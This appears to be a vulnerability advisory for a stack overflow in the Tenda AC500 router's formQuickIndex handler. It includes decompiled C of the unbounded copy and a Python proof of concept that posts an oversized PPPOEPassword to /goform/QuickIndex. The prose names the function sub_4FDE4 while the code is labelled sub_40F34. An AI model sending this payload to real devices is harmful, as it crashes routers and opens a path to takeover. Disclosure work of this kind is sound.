## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2470.html

## Affected version

AC500 V2.0.1.9(1307)

## Vulnerability details

The Tenda AC500 V2.0.1.9(1307) firmware has a stack overflow vulnerability in the `formQuickIndex` function. The `v8` variable receives the `PPPOEPassword` parameter from a POST request and is later assigned to the `s` variable, which is fixed at 72 bytes. However, since the user can control the input of  `PPPOEPassword`, in function `sub_4FDE4`, the statement: 

```c
_BYTE *__fastcall sub_40F34(_BYTE *result, _BYTE *a2)
{
  _BYTE *v2; // [sp+0h] [bp-Ch]
  _BYTE *v3; // [sp+4h] [bp-8h]

  v3 = result;
  v2 = a2;
  if ( result && a2 )
  {
    while ( *v3 )
    {
      if ( *v3 == 92 )
        ++v3;
      *v2++ = *v3++;
    }
    *v2 = 0;
  }
  return result;
}
```

can cause a stack overflow. The user-provided  `PPPOEPassword` can exceed the capacity of the `s` array, triggering this security vulnerability.

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/QuickIndex"
payload = b"a"*1000

data = {"mit_linktype":"2","PPPOEPassword": payload}
response = requests.post(url, data=data)
print(response.text)
```

![](https://github.com/abcdefg-png/images2/blob/main/image-20240410095742473.png)
